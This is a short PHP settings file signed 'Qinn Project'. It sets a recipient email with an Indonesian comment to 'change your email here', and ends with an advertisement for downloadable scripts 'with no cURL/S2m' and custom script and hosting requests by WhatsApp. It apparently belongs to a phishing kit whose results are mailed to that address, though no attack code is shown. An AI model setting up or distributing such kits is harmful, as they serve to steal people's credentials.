<?php

// Made By Qinn Project
// IG : @qinn.projectt_
// GitHub : github.com/qinndesainn

$emailku = 'qinn.project@gmail.com'; // ganti email kamu disini

?>

 <====!dwnload sc di cloud.qinn.my.id aja di jamin no cURL/S2m!=====>
<==/reedit sc,Req sc kebutuhan hosting wa : +1 (559) 214-2950\==>
